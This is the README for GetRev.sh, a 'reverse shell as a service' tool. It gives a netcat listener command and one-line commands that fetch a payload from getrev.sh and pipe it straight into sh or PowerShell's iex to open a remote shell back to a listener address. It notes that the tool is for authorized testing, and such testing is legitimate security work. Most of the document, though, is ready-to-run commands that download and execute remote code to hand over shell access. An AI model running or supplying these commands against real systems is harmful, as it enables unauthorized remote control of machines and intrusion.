# GetRev.sh

> Reverse Shell as a Service — [getrev.sh](https://getrev.sh)

An easy-to-remember reverse shell for Unix-like systems and Windows PowerShell. Give it your listener address; it detects what is available and returns a readable payload.

## Usage

Listen for the callback:

```sh
nc -lvnp 4444
```

Connect from an authorized Linux or macOS host:

```sh
curl -fsSL https://getrev.sh/10.0.0.5:4444 | sh
```

Without curl:

```sh
wget -qO- https://getrev.sh/10.0.0.5:4444 | sh
```

From Windows PowerShell:

```powershell
irm 'https://getrev.sh/10.0.0.5:4444' | iex
```

Replace the example address and port consistently. Hostnames and bracketed IPv6 addresses are supported. On Unix, GetRev.sh tries supported runtimes in order until one connects; on Windows, it returns a PowerShell payload.

For systems you own or are explicitly authorized to test.

Inspired by [reverse-shell.sh](https://github.com/lukechilds/reverse-shell) by Luke Childs. Released under the [MIT License](LICENSE).
